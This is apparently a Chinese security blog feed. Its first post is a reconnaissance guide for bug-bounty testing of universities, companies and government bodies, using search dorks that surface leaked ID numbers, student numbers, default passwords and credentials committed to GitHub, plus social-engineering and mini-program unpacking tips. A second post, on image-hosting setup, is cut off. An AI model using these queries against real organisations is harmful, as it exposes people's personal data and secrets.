gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">-----------------------------常常用到的-----------------------------<br>site:xx.edu.cn filetype:pdf 身份证 学号 工号<br>site:xx.edu.cn filetype:docx 身份证 学号 工号<br>site:xx.edu.cn filetype:xlsx 身份证 学号 工号<br><br>---------------------------------------------------------------------------------------<br>title关键词<br>site:google.com intitle:身份证|<span class="hljs-string">sfz</span>|<span class="hljs-string">学号</span>|<span class="hljs-string">xh</span>|<span class="hljs-string">登录</span>|<span class="hljs-string">注册</span>|<span class="hljs-string">管理</span>|<span class="hljs-string">平台</span>|<span class="hljs-string">验证码</span>|<span class="hljs-string">账号</span>|<span class="hljs-string">系统</span>|<span class="hljs-string">手册</span>|<span class="hljs-string">默认密码</span>|<span class="hljs-string">初始密码</span>|<span class="hljs-string">password</span>|<span class="hljs-string">联系电话</span>|<span class="hljs-string">操作手册</span>|<span class="hljs-string">vpn</span>|<span class="hljs-string">名单</span><br><span class="hljs-string"></span><br><span class="hljs-string">body关键词</span><br><span class="hljs-string">site:google.com intext:身份证</span>|<span class="hljs-string">sfz</span>|<span class="hljs-string">学号</span>|<span class="hljs-string">xh</span>|<span class="hljs-string">登录</span>|<span class="hljs-string">注册</span>|<span class="hljs-string">管理</span>|<span class="hljs-string">平台</span>|<span class="hljs-string">验证码</span>|<span class="hljs-string">账号</span>|<span class="hljs-string">系统</span>|<span class="hljs-string">手册</span>|<span class="hljs-string">默认密码</span>|<span class="hljs-string">初始密码</span>|<span class="hljs-string">password</span>|<span class="hljs-string">联系电话</span>|<span class="hljs-string">操作手册</span>|<span class="hljs-string">vpn</span>|<span class="hljs-string">名单</span><br><span class="hljs-string"></span><br><span class="hljs-string">文件类型（文件类型不支持｜，需要拆分出来单独查询）</span><br><span class="hljs-string">site:google.com filetype:pdf</span>|<span class="hljs-string">xls</span>|<span class="hljs-string">xlsx</span>|<span class="hljs-string">docx</span>|<span class="hljs-string">doc</span>|<span class="hljs-string">text</span>|<span class="hljs-string">ini</span>|<span class="hljs-string">mdb</span>|txt<br><br>SQL注入<br>site:google.com inurl:aspx|<span class="hljs-string">asp</span>|<span class="hljs-string">php</span>|<span class="hljs-string">jsp</span>|<span class="hljs-string">do</span>|<span class="hljs-string">.action</span>|html<br><br>文件路径<br>site:google.com inurl:login|<span class="hljs-string">admin</span>|<span class="hljs-string">manage</span>|<span class="hljs-string">sysadmin</span>|<span class="hljs-string">system</span>|<span class="hljs-string">master</span>|<span class="hljs-string">admin_login</span>|<span class="hljs-string">cms</span>|<span class="hljs-string">data</span>|<span class="hljs-string">templates</span>|index<br><br>文件上传<br>site:google.com inurl:file|<span class="hljs-string">upload</span>|<span class="hljs-string">uploadfile</span>|<span class="hljs-string">ewebeditor</span>|<span class="hljs-string">kindediter</span>|<span class="hljs-string">Ueditor</span>|<span class="hljs-string">file</span>|choosefile<br><br> -----------------------------目录穿越-----------------------------<br>intitle:index.of <span class="hljs-string">&quot;parent directory&quot;</span><br>intitle:index of /ppt<br>intitle:index of /password<br>intext:转到父目录/转到父路径<br>intext:to parent directory<br><br> -----------------------------业务相关性-----------------------------<br>site:google.com <span class="hljs-string">&quot;审计报告&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;财务报告&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;科技奖&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;发明专利&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;财务报告&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;无犯罪记录&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;特发此证&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;出版合同&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;甲方代表&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;乙方代表&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;籍贯&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;汉族&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br>site:google.com <span class="hljs-string">&quot;职称&quot;</span> <span class="hljs-string">&quot;身份证&quot;</span> <span class="hljs-string">&quot;SFZ&quot;</span><br><br>邮箱配置信息泄露<br>site:github.com <span class="hljs-string">&quot;google.com&quot;</span> smtp password<br>site:github.com <span class="hljs-string">&quot;google.com&quot;</span> smtp <span class="hljs-meta">@126.com</span><br>site:github.com <span class="hljs-string">&quot;google.com&quot;</span> String password smtp<br><br><br>数据库信息泄露<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> root password<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> sa password<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> User ID=&#x27;sa&#x27;;Password<br><br>svn信息泄露<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> svn<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> svn password<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> svn username<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> svn username password<br><br>数据库备份文件<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> inurl:sql<br><br><br>综合信息泄露<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> password<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> ftp ftppassword<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> 密码<br>site:github.com  <span class="hljs-string">&quot;google.com&quot;</span> 内部<br></code></pre></td></tr></table></figure><p>2、网站时光机：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">找一些路由，替换参数url为网址即可<br>https:<span class="hljs-string">//web.archive.org/cdx/search</span>?collapse=urlkey&amp;fl=original&amp;limit=10000000000000000&amp;matchType=domain&amp;output=text&amp;url=1<br><br>时光机可以查看一些文件，在下面的那个红色框里面搜索：<span class="hljs-string">.txt</span>、<span class="hljs-string">.xlsx</span>、<span class="hljs-string">.pdf...</span><br>https:<span class="hljs-string">//web.archive.org/</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/16/QdiqJRbSyoG6kzx.png" alt="image-20241216002113703"></p><p>3、github泄露：（在挖掘企业时有时候有奇效）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">in</span>:name baidu       #标题搜索含有关键字baidu<br><span class="hljs-attribute">in</span>:descripton baidu     #仓库描述搜索含有关键字<br><span class="hljs-attribute">in</span>:readme baidu       #Readme文件搜素含有关键字<br><span class="hljs-attribute">stars</span>:&gt;<span class="hljs-number">3000</span> baidu      #stars数量大于<span class="hljs-number">3000</span>的搜索关键字<br><span class="hljs-attribute">stars</span>:<span class="hljs-number">1000</span>..<span class="hljs-number">3000</span> baidu   #stars数量大于<span class="hljs-number">1000</span>小于<span class="hljs-number">3000</span>的搜索关键字<br><span class="hljs-attribute">forks</span>:&gt;<span class="hljs-number">1000</span> baidu      #forks数量大于<span class="hljs-number">1000</span>的搜索关键字<br><span class="hljs-attribute">forks</span>:<span class="hljs-number">1000</span>..<span class="hljs-number">3000</span> baidu   #forks数量大于<span class="hljs-number">1000</span>小于<span class="hljs-number">3000</span>的搜索关键字<br><span class="hljs-attribute">size</span>:&gt;=<span class="hljs-number">5000</span> baidu      #指定仓库大于<span class="hljs-number">5000</span>k(<span class="hljs-number">5</span>M)的搜索关键字<br><span class="hljs-attribute">pushed</span>:&gt;<span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span> baidu  #发布时间大于<span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span>的搜索关键字<br><span class="hljs-attribute">created</span>:&gt;<span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span> baidu  #创建时间大于<span class="hljs-number">2019</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span>的搜索关键字<br><span class="hljs-attribute">user</span>:name         #用户名搜素<br><span class="hljs-attribute">license</span>:apache-<span class="hljs-number">2</span>.<span class="hljs-number">0</span> baidu  #明确仓库的 LICENSE 搜索关键字<br><span class="hljs-attribute">language</span>:java baidu     #在java语言的代码中搜索关键字<br><span class="hljs-attribute">user</span>:baidu in:name baidu   #组合搜索,用户名baidu的标题含有baidu的等等<br></code></pre></td></tr></table></figure><p>3、目录扫描</p><p>这个目录扫描并非全是纯跑目录字典，更别说那些waf比较强的站点，你更不可能全去爆破，最重要的点还有有想象力，根据站点已暴露的目录，去猜其他可能的站点，例如：有&#x2F;login目录，那也有可能有一个&#x2F;register站点。</p><p>4、中间件</p><p>收集方式</p><p>请求头、指纹识别暴露 、wappalyzer 、根据报错信息判断 、根据默认页面判断。</p><p>5、开发语言</p><p>查看网站包 </p><p>查看站点文件后缀 </p><p>搜索引擎：site:&lt;域名&gt; &lt;语言&gt;</p><p>6、源码查找</p><p>可以直接指纹识别CMS、寻找网站框架，根据网站的一些图标、logo、关键字，还有一些特殊的目录，甚至是f12源代码中的作者泄露去寻找源码。</p><p>源码可以在github、fofa、搜索引擎、专属源码站点上去寻找</p><h2 id="Edusrc信息收集"><a href="#Edusrc信息收集" class="headerlink" title="Edusrc信息收集"></a>Edusrc信息收集</h2><p>信息收集重心：学号、身份证、工号、电话号</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-comment">-----------------------------google语法-----------------------------</span><br><span class="hljs-title">site</span>:xx.edu.cn file<span class="hljs-keyword">type</span>:pdf 身份证 学号 工号 初始密码<br><span class="hljs-title">site</span>:xx.edu.cn file<span class="hljs-keyword">type</span>:docx 身份证 学号 工号<br><span class="hljs-title">site</span>:xx.edu.cn file<span class="hljs-keyword">type</span>:xlsx 身份证 学号 工号<br><br>再者就是学校官网的文件的信息泄露：帮助说明、默认密码、贫困生补助、奖学金补助等<br><span class="hljs-comment">-----------------------------fofa语法-----------------------------</span><br>通用挖掘：(<span class="hljs-string">&quot;注册&quot;</span> || <span class="hljs-string">&quot;系统&quot;</span> || <span class="hljs-string">&quot;登录&quot;</span> || <span class="hljs-string">&quot;后台&quot;</span> || <span class="hljs-string">&quot;管理&quot;</span>) &amp;&amp; org=<span class="hljs-string">&quot;China Education and Research Network Center&quot;</span><br><br>单个学校收集，当然主域名不止这一个<br><span class="hljs-title">domain</span>=<span class="hljs-string">&quot;xxx.edu.cn&quot;</span> || cert=<span class="hljs-string">&quot;xxx.edu.cn&quot;</span> || cert=<span class="hljs-string">&quot;xx大学&quot;</span>  ....<br><br><span class="hljs-comment">-----------------------------偏门一点的检索方式-----------------------------</span><br><span class="hljs-number">1</span>、可以去当地的教育局查看是否有敏感信息。<br>直接使用搜索引擎，哪个省份哪个市，就找那个省份那个市的教育厅，去找可能的奖学金文件。<br><span class="hljs-number">2</span>、直接去社交平台找泄露<br>抖音、小红书、微博、贴吧、快手、qq频道<br><span class="hljs-number">3</span>、社工哥<br><span class="hljs-number">3.1</span>、直接加qq群，你知道的呀！<br><span class="hljs-number">3.2</span>、可以去找一些学校可能存在什么失物招领的平台，直接打call，你知道的呀！<br><br></code></pre></td></tr></table></figure><p>还有就是一些学校肯定不止一个域名，他还会存在其他分支，虽然上面的fofa语法也可以检索一些出来，但并不完全</p><p>以浙江大学为例，我们可以在企查查上去看</p><p><img src="https://s2.loli.net/2024/12/14/I5C6ukZjo2PbULe.png" alt="image-20241214123147943"></p><p>这些资产都隶属浙江大学，都是可以收集的，这里可以参考之前子公司收集的思路结局。拿到了主域名，再参考子域名收集。</p><h2 id="供应链信息收集"><a href="#供应链信息收集" class="headerlink" title="供应链信息收集"></a>供应链信息收集</h2><p>实在无法破局，采用供应链（多在edu、企业也有）</p><p>基本阐述</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">1、确定供应商<br>关键系统的版权信息，最底部<br><br>2、无版权信息，信息收集得到单位喜欢使用的供应商产品<br>3、目标的<span class="hljs-strong">**招标**</span>公开网（学校）<br>再找关键应用的供应商<br><br>4、爱企查、天眼查找招标信息<br>5、用全国采购与招标网<br>6、借用系统的https证书确定开发单位<br>还有一种，有部分系统在访问前，会需要你先安装什么程序或者插件，从中也可以提取出相关的证书，从而确认其生产单位<br><br>7（重点）、去测试相同产品的站点，如果渗透成功，就以这个站点类比目标站点，去寻找可能存在的相同路由，相同漏洞点。也有可能两个站点之间存在某种隐藏的联系和关联处。甚至可以直接切换请求头host，把包直接替换<br></code></pre></td></tr></table></figure><p>结语：在复杂环境下，效率偏低</p><h2 id="小程序-公众号"><a href="#小程序-公众号" class="headerlink" title="小程序&amp;公众号"></a>小程序&amp;公众号</h2><p>针对一些web打不动的资产，说不定其小程序公众号会有洞可以寻，所以小程序公众号的信息收集必不可少</p><h3 id="小程序-公众号定位"><a href="#小程序-公众号定位" class="headerlink" title="小程序&amp;公众号定位"></a>小程序&amp;公众号定位</h3><p>1、微信搜索</p><p>根据资产名称在微信中搜索，以”华为”为例，其公司全称为”华为技术有限公司”。</p><p>企查查</p><p><img src="https://s2.loli.net/2024/12/16/ZcMjTrHGpz4tsCa.png" alt="image-20241216002127072"></p><p>小蓝本</p><p><img src="https://s2.loli.net/2024/12/16/aG9n51iRgPpsYUk.png" alt="image-20241216002134714"></p><h3 id="公众号-小程序如何信息收集"><a href="#公众号-小程序如何信息收集" class="headerlink" title="公众号&amp;小程序如何信息收集"></a>公众号&amp;小程序如何信息收集</h3><p>主要在<strong>模拟器、手机端</strong>上实现，不知道为什么，一些信息不能直接在pc端微信上获取，下述是在模拟器的收集过程</p><p>1、小程序</p><p><img src="https://s2.loli.net/2024/12/16/sLvzJnOtVmYxRUh.png" alt="image-20241216002152475"></p><p><img src="https://s2.loli.net/2024/12/19/TJF4ajKSnsNGovl.png" alt="image-20241216002203367"></p><p><img src="https://s2.loli.net/2024/12/16/UzVgEetskRPHamB.png" alt="image-20241216002214292"></p><p><img src="https://s2.loli.net/2024/12/19/NJ8aOhLtWed54CT.png" alt="image-20241216002224336"></p><p>对于一些大厂的小程序公众号可能含有上述三个信息，不过最常见的就是”更多资料“</p><p><img src="https://s2.loli.net/2024/12/16/YpmC5LOTRXcyjWH.png" alt="image-20241216002347480"></p><p>可获取appid、备案号</p><p>根据备案号也可以反查其他小程序</p><p><img src="https://s2.loli.net/2024/12/16/ix4ZOPHhsf6Cnqb.png" alt="image-20241216002354244"></p><p>在pc端我却是没有找到收集路径，还希望佬们指点指点。</p><p>2、公众号</p><p><img src="https://s2.loli.net/2024/12/19/qoIlbr9fKnc1SMV.png" alt="image-20241216002400610"></p><p><img src="https://s2.loli.net/2024/12/16/uhBTyRvqINSgK9O.png" alt="image-20241216002419675"></p><p><img src="https://s2.loli.net/2024/12/16/ivXeb4BEmQglL8z.png" alt="image-20241216002426884"></p><p>再在企查查等上面去查，获取更多的小程序、公众号</p><p><img src="https://s2.loli.net/2024/12/16/ZNzqyW27mBtETrS.png" alt="image-20241216002437858"></p><p>3、抓包方面</p><p>抓包测试方面也一起说了，不知道为什么我在模拟器（夜神）搜公众号，总是没有结果，所以我直接在pc端进行抓包测试了，虽然在pc端无法信息收集，但是抓包测试绝对是一把好手！并且我做了对比，pc端和手机端的公众号、小程序的数目没有差别（反正我没有看到差别）。</p><p>抓包主要使用：burp+proxifier+pc端微信即可</p><p>参考：<a href="https://mp.weixin.qq.com/s/_x8c88RQ8zoeEqRVnvBPtg">https://mp.weixin.qq.com/s/_x8c88RQ8zoeEqRVnvBPtg</a></p><h3 id="小程序逆向"><a href="#小程序逆向" class="headerlink" title="小程序逆向"></a>小程序逆向</h3><p>获取接口+资产信息</p><p>工具：</p><p>1、<a href="https://github.com/Siffre/wxappUnpacker">https://github.com/Siffre/wxappUnpacker</a></p><p><strong>可以关注其中有没有硬编码的密码、企业微信key、公众号key、AK&#x2F;SK等等，此外app.json里一般都写好了小程序要调用的接口路径，按照常规思路利用攻击即可！</strong></p><p>2、pc端小程序目录逆向</p><p>3、unveilr逆向</p><p>测试方向：逻辑漏洞、文件上传（头像处、身份证上传）、越权</p><p>挖掘方法也比较简单，比如在有验证下一步的时候，抓包，查看返回包响应码，尝试修改响应码，或者其他你认为影响返回状态的值（具体情况具体分析），尝试能不能绕过。举个例子，比方说输入验证码，我们先输入正确的验证码，查看返回包特征和状态，然后输入一个错误的验证码，把刚刚正确的返回包特征尝试替换，看看能不能绕过</p><p>4、逆向+敏感信息查找</p><p>Wxapp</p><p><img src="https://s2.loli.net/2024/12/16/3yLRSZePbtsTfgM.png" alt="image-20241216002450452"></p><p><img src="https://s2.loli.net/2024/12/16/KVvXjcpJ2kDBtfb.png" alt="image-20241216002458002"></p><h3 id="F12调试小程序"><a href="#F12调试小程序" class="headerlink" title="F12调试小程序"></a>F12调试小程序</h3><p>开<strong>小号</strong>调试，可能会被封！</p><p><a href="https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python">https://github.com/JaveleyQAQ/WeChatOpenDevTools-Python</a></p><p><img src="https://s2.loli.net/2024/12/16/2Vzp1W6CYx4kvKO.png" alt="image-20241216002504398"></p><p>这个工具的用法也是很简单，我们进去微信之后（最好用小号避免封号），直接运行python main.py -x</p><p>然后进入小程序</p><p><img src="https://s2.loli.net/2024/12/16/B2doSLeJ6yq5Fvu.png" alt="image-20241216002510866"></p><p> 即可调试</p><h2 id="apk信息收集"><a href="#apk信息收集" class="headerlink" title="apk信息收集"></a>apk信息收集</h2><p>1、利用工具APPinfoScanner</p><p>通常场景下我们扫的只有目标APK文件，这里直接用第一条命令</p><p>python app.py android -i 123.apk</p><p>结果如下</p><p><img src="https://s2.loli.net/2024/12/16/4BpVGgMyWl3EA1f.png" alt="image-20241216002516753"></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">扫描ios的ipa文件、machine-o文件<br>python app<span class="hljs-selector-class">.py</span> ios -<span class="hljs-selector-tag">i</span> xxx<span class="hljs-selector-class">.ipa</span><br><br>扫描web站点的文件、目录、需要缓存的站点URL<br>python app<span class="hljs-selector-class">.py</span> web -<span class="hljs-selector-tag">i</span> www<span class="hljs-selector-class">.xxx</span>.com<br></code></pre></td></tr></table></figure><p>app测试得比较少，不太会信息收集，只能当脚本小子了，惭愧惭愧！</p><h2 id="国外站点信息收集"><a href="#国外站点信息收集" class="headerlink" title="国外站点信息收集"></a>国外站点信息收集</h2><p>国内用到企查查、天眼查、小蓝本这些，去构建“股权树”，梳理公司</p><p>国外就可以用到以下网站</p><p><a href="https://www.crunchbase.com/">https://www.crunchbase.com</a></p><p>以google为例，下面的ORG为相关组织，就是公司，People就是法定代表人</p><p><img src="https://s2.loli.net/2024/12/16/R6NvTuwjeKHdWZ3.png" alt="image-20241216012216630.png"></p><p>随便点一个组织点进去，下面就是资产入口</p><p><img src="https://s2.loli.net/2024/12/19/DohsuVIUk2QN1KP.png" alt="image-20241216013250281.png"></p><p>使用fofa结合crt证书收集，也很不多，这个主要是用来收集主域名，其他子域名，可以采上述的子域名收集，不过使用工具时，最好搭个代理，这样收集得更多。</p><h2 id="偏僻子域名"><a href="#偏僻子域名" class="headerlink" title="偏僻子域名"></a>偏僻子域名</h2><p><a href="https://otx.alienvault.com/api/v1/indicators/domain/baidu.com/url_list?limit=100&page=1">https://otx.alienvault.com/api/v1/indicators/domain/baidu.com/url_list?limit=100&amp;page=1</a></p><p>试试就知道了，想查什么域名，就替换baidu.com这一项就行，最后面的</p><h2 id="政府信息收集"><a href="#政府信息收集" class="headerlink" title="政府信息收集"></a>政府信息收集</h2><p>说到政府机构的信息收集，感觉跟企业的话，主要是在获取主域名的时候有点区别，主域名不能再依靠企查查、天眼查了。</p><p>提供以下两种方式去收集</p><p>1、搜索引擎</p><p>以重庆教育委员会为例，我们直接用百度词条，搜“重庆市教育委员会”或者“重庆市教育委员会 百度百科”</p><p><img src="https://s2.loli.net/2024/12/16/bSVRXMgAj4cp8e6.png" alt="image-20241216143809134"></p><p>直接进点入内设机构，就可以看到相关单位</p><p><img src="https://s2.loli.net/2024/12/16/XcVTbq74KkAouDJ.png" alt="image-20241216143900097"></p><p>以第一个管理学校为例</p><p><img src="https://s2.loli.net/2024/12/16/ih8mevMDQFR3ugz.png" alt="image-20241216144011951"></p><p>直接再搜他，找到他的官网，看备案号</p><p><img src="https://s2.loli.net/2024/12/16/Y7O3E9528DugkNz.png" alt="image-20241216144118518"></p><p>再到ICP备案</p><p><img src="https://s2.loli.net/2024/12/16/y4LRQ6wtPojz2ZO.png" alt="image-20241216155215421"></p><p>就差不多了。</p><p>此外一个小tips，厅级单位打不下来，可以尝试打局级单位，尤其是省会的局级单位，内网有很大可能是通的，可以从下往上打。</p><h2 id="自动化信息收集"><a href="#自动化信息收集" class="headerlink" title="自动化信息收集"></a>自动化信息收集</h2><p>先上个开胃菜，谈到自动化信息收集，肯定离不开ARL灯塔，这玩意是真好用，基础指纹识别、基础数据包请求响应、站点截图、泄露扫描、Host碰撞、WIH调用（在JS中收集域名,AK&#x2F;SK等信息）。不过还是需要自己通过收集主域名。</p><p>这些都还不错，还可以扩展一点。我这是用docker安装的ARL，有时候朋友们在安装的时候，可能就会因为docker的一些报错整破防了，这里推荐很不错的脚本，里面配备着很多脚本的安装，简直一绝</p><p><img src="https://s2.loli.net/2024/12/16/kwohqu4mv2Kfa7n.png" alt="image-20241216231744111"></p><p>项目地址：<a href="https://gitee.com/yijingsec/LinuxEnvConfig">https://gitee.com/yijingsec/LinuxEnvConfig</a></p><p>然后就是一些基础配置了，直接打开config-docker.yaml，直接配置fofa、hunter..的API，或有禁用的域名也改一改。</p><p>然后再策略配置的这一块，也可以配置相关的信息收集</p><p><img src="https://s2.loli.net/2024/12/16/hmctHGlE7UzLYwK.png" alt="image-20241216233801365"></p><p>配置完直接梭哈就完事了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>typora+hexo博客图片踩坑速记</title>
    <link href="/2024/12/13/typora-hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E8%B8%A9%E5%9D%91%E9%80%9F%E8%AE%B0/"/>
    <url>/2024/12/13/typora-hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E8%B8%A9%E5%9D%91%E9%80%9F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="typora破解版-hexo-smms图床"><a href="#typora破解版-hexo-smms图床" class="headerlink" title="typora破解版+hexo+smms图床"></a>typora破解版+hexo+smms图床</h1><h2 id="图床相关配置"><a href="#图床相关配置" class="headerlink" title="图床相关配置"></a>图床相关配置</h2><p>网上教程千千万，不知道翻了多久才找到成功配置。</p><p>故写此文记录一下：</p><p>不要用Picgo（APP），反正我没成功过。</p><p>这里推荐使用Picgo-Core</p><p><img src="https://s2.loli.net/2024/12/13/UvuHWwcxaYmV6sg.png" alt="image-20241213160043397"></p><p>直接“下载或更新”，就会弹一个下载条，等下载完后</p><p><img src="https://s2.loli.net/2024/12/13/lfKqVwCTsOtcYMz.png" alt="image-20241213165221391"></p><p>查看typora的缓存目录下的picgo，一般在 C:\Users\Yf\AppData\Roaming\Typora\picgo\win64</p><p><img src="https://s2.loli.net/2024/12/13/W2k9YQOHAMVgFJn.png"></p><p>然后再点击配置文件</p><p><img src="https://s2.loli.net/2024/12/13/Eu16aoObpe3JLDd.png" alt="image-20241213165201046"></p><p>把里面的代码替换为下述代码，并替换API</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs axapta">&#123; <br>    <span class="hljs-string">&quot;picBed&quot;</span>: &#123; <br>        <span class="hljs-string">&quot;current&quot;</span>: <span class="hljs-string">&quot;smms-user&quot;</span>, <br>        <span class="hljs-string">&quot;uploader&quot;</span>: <span class="hljs-string">&quot;smms-user&quot;</span>,<br>        <span class="hljs-string">&quot;smms-user&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Authorization&quot;</span>: <span class="hljs-string">&quot;这里替换成你自己的&quot;</span> <br>        &#125;, <br>        <span class="hljs-string">&quot;transformer&quot;</span>: <span class="hljs-string">&quot;path&quot;</span> &#125;, <br>    <span class="hljs-string">&quot;picgoPlugins&quot;</span>: &#123; <br>        <span class="hljs-string">&quot;picgo-plugin-smms-user&quot;</span>:<br>        <span class="hljs-literal">true</span> <br>    &#125; <br>&#125; <br></code></pre></td></tr></table></figure><p>如下</p><p><img src="https://s2.loli.net/2024/12/13/edC9MFyZwr25aH1.png" alt="image-20241213165410555"></p><p>再使用picgo.exe安装nodejs插件，命令行运行以下指令。</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">picgo.exe <span class="hljs-keyword">install</span> smms-user<br></code></pre></td></tr></table></figure><p>就OK了</p><p>注意，下面这个验证图片选项会失败，但是你正常写笔记的时候，还是图片还是会畅通无助上传到smms图床。</p><p><img src="https://s2.loli.net/2024/12/13/VrJSR1d9MBpsfPL.png" alt="image-20241213165828439"></p><p>如果还是上传失败，修改config.json，如下</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  